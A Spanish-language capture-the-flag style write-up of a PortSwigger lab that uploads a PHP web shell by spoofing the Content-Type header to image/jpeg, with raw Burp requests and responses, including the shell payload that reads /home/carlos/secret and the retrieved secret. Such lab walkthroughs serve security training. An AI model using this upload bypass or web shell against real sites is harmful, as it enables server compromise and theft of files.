# 🗃️ Laboratorio: Carga de shell web mediante omisión de restricción de tipo de contenido

### Explotar la validación defectuosa de la carga de archivos

En la naturaleza, es poco probable que encuentre un sitio web que no tenga protección contra ataques de carga de archivos como vimos en la práctica de laboratorio anterior. Pero el hecho de que existan defensas no significa que sean sólidas. A veces aún es posible explotar las fallas en estos mecanismos para obtener un shell web para la ejecución remota de código.

### Validación de tipo de archivo defectuosa

Al enviar formularios HTML, el navegador normalmente envía los datos proporcionados en una `POST`solicitud con el tipo de contenido `application/x-www-form-url-encoded`. Esto está bien para enviar texto simple como su nombre o dirección. Sin embargo, no es adecuado para enviar grandes cantidades de datos binarios, como un archivo de imagen completo o un documento PDF. En este caso, `multipart/form-data`se prefiere el tipo de contenido.

### Validación de tipo de archivo defectuosa - Continuación

Considere un formulario que contenga campos para cargar una imagen, proporcionar una descripción de la misma e ingresar su nombre de usuario. Enviar un formulario de este tipo podría dar como resultado una solicitud similar a esta:

`POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--`

Como puede ver, el cuerpo del mensaje se divide en partes separadas para cada una de las entradas del formulario. Cada parte contiene un `Content-Disposition`encabezado, que proporciona información básica sobre el campo de entrada con el que se relaciona. Estas partes individuales también pueden contener su propio `Content-Type`encabezado, que le indica al servidor el tipo MIME de los datos que se enviaron mediante esta entrada.

### Validación de tipo de archivo defectuosa - Continuación

Una forma en que los sitios web pueden intentar validar la carga de archivos es verificar que este `Content-Type`encabezado específico de entrada coincida con un tipo MIME esperado. Si el servidor solo espera archivos de imagen, por ejemplo, es posible que solo permita tipos como `image/jpeg`y `image/png`. Pueden surgir problemas cuando el servidor confía implícitamente en el valor de este encabezado. Si no se realiza ninguna validación adicional para verificar si el contenido del archivo realmente coincide con el supuesto tipo MIME, esta defensa se puede eludir fácilmente utilizando herramientas como Burp Repeater.

El encabezado `Content-Type` en HTTP se utiliza para indicar el tipo de medio del recurso que se está enviando o recuperando. Algunos tipos MIME comunes y sus correspondientes encabezados `Content-Type` incluyen:

1. **Texto:**
   * `text/plain`: Texto sin formato.
   * `text/html`: Documento HTML.
2. **Imagen:**
   * `image/jpeg`: Imágenes JPEG.
   * `image/png`: Imágenes PNG.
   * `image/gif`: Imágenes GIF.
3. **Audio:**
   * `audio/mpeg`: Archivos de audio MP3.
   * `audio/wav`: Archivos de audio WAV.
4. **Video:**
   * `video/mp4`: Archivos de video MP4.
   * `video/mpeg`: Archivos de video MPEG.
5. **Aplicación:**
   * `application/json`: Datos en formato JSON.
   * `application/xml`: Datos en formato XML.
   * `application/pdf`: Documentos PDF.
   * `application/octet-stream`: Datos binarios sin formato.
6. **Formularios:**
   * `multipart/form-data`: Utilizado para la subida de archivos en formularios.
7. **Comprimidos:**
   * `application/zip`: Archivos comprimidos en formato ZIP.
8. **JavaScript:**
   * `application/javascript`: Código JavaScript.
9. **CSS:**
   * `text/css`: Hojas de estilo en cascada (CSS).
10. **Archivos descargables:**
    * `application/octet-stream`: Puede ser usado para descargar cualquier tipo de archivo binario.

### Laboratorio: carga de shell web mediante omisión de restricción de tipo de contenido

APRENDIZ

LABORATORIONo resuelto

Esta práctica de laboratorio contiene una función de carga de imágenes vulnerables. Intenta evitar que los usuarios carguen tipos de archivos inesperados, pero se basa en verificar la entrada controlable por el usuario para verificar esto.

Para resolver la práctica de laboratorio, cargue un shell web PHP básico y utilícelo para filtrar el contenido del archivo `/home/carlos/secret`. Envíe este secreto usando el botón provisto en el banner del laboratorio.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:`wiener:peter`

```python
// Some code

Laboratorio: carga de shell web mediante omisión de restricción de tipo de contenido



PROBAMOS INICIAAR SESION CON WIENER



REQUEST:



GET /my-account?id=wiener HTTP/1.1
Host: 0a4c004903c9c60e832419d800720000.web-security-academy.net
Cookie: session=TDHOCx352ucb2wa4lawaMkiWaSeAboyQ
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4c004903c9c60e832419d800720000.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close




PROBAMOS CAMBIAR EL MAIL DE WIOENER:


REQUEST:

POST /my-account/change-email HTTP/2
Host: 0a4c004903c9c60e832419d800720000.web-security-academy.net
Cookie: session=TDHOCx352ucb2wa4lawaMkiWaSeAboyQ
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a4c004903c9c60e832419d800720000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4c004903c9c60e832419d800720000.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

email=P4IM0N%40hotmail.com&csrf=hSQKRANZGUSIyf52h7rwucEqWy5PKBWa




CARGAMOS EL AVATAR EN .JPEG Y VIMOS LA RESPUESTA VEMOS TAMBIEN QEU EL CONTENT TYPE DEL ENCABEZADO PRINCIPAL ES Content-Type: multipart/form-data; Y EL DE CARGA DE IMAGEN INDIVIDUAL EL MIME QUE LE INDICA QUE DEBE ESPERAR EL SERVIDOR DE TIPO DE ARCHIVO ES Content-Type: image/jpeg:


REQUEST:

POST /my-account/avatar HTTP/2
Host: 0a4c004903c9c60e832419d800720000.web-security-academy.net
Cookie: session=TDHOCx352ucb2wa4lawaMkiWaSeAboyQ
Content-Length: 225065
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a4c004903c9c60e832419d800720000.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydMSvUDBM3tjWIOov
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4c004903c9c60e832419d800720000.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="avatar"; filename="_58adb40c-aeb8-4be6-91c7-70efe1f7cd50.jpeg"
Content-Type: image/jpeg

ÿØÿë2ÎJP6............


------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="csrf"

hSQKRANZGUSIyf52h7rwucEqWy5PKBWa
------WebKitFormBoundarydMSvUDBM3tjWIOov--





LUEGO DE CARGAR El AVATAR NOS MUESTRA ESTO EN LA WEB QUE SE CAGO LA IMAGEN:


The file avatars/_58adb40c-aeb8-4be6-91c7-70efe1f7cd50.jpeg has been uploaded.
� Back to My Account





LUEGO EN EL PANEL VERIFICAMOS CON QUE RUTA SE CARGA PARA MOSTRASCE EL AVATAR:


<img src="/files/avatars/_58adb40c-aeb8-4be6-91c7-70efe1f7cd50.jpeg" class="avatar">





PRIMERA PRUEBA DE CARGA DEL SCRIPT DEJAMOS EL CONTENT TYPE EN IMAGE/JPEG Y PUSIMOS EL FILE NAME CON NUESTRO NOMBRE E ARCHIVO .PHP:





REQUEST:




POST /my-account/avatar HTTP/2
Host: 0a4c004903c9c60e832419d800720000.web-security-academy.net
Cookie: session=TDHOCx352ucb2wa4lawaMkiWaSeAboyQ
Content-Length: 225065
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a4c004903c9c60e832419d800720000.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydMSvUDBM3tjWIOov
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4c004903c9c60e832419d800720000.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="avatar"; filename="paimonshell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarydMSvUDBM3tjWIOov
Content-Disposition: form-data; name="csrf"

hSQKRANZGUSIyf52h7rwucEqWy5PKBWa
------WebKitFormBoundarydMSvUDBM3tjWIOov--



RESPONSE:





HTTP/2 200 OK
Date: Mon, 29 Jan 2024 01:37:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 136

The file avatars/paimonshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>







TRATAMOS DE MANDAR UNA REQUEST POR GET A LA RUTA DONDE SE  GUARDO NUESTRO ARCHIVO DEL SCRIPT DEL SHELM A VER SI FUNCIONO Y NOS TRAE LOS DATOS :




REQUEST Y BINGO SE TENZO:


GET /files/avatars/paimonshell.php HTTP/2
Host: 0a4c004903c9c60e832419d800720000.web-security-academy.net
Cookie: session=TDHOCx352ucb2wa4lawaMkiWaSeAboyQ
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a4c004903c9c60e832419d800720000.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8







RESPONSE TENEMOS EL SECRETO DEL POBRE CARLITOS:



HTTP/2 200 OK
Date: Mon, 29 Jan 2024 01:40:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

YBQ70dhaYr1Y7W1IRLHLdgmfJ4sa0NoA
```
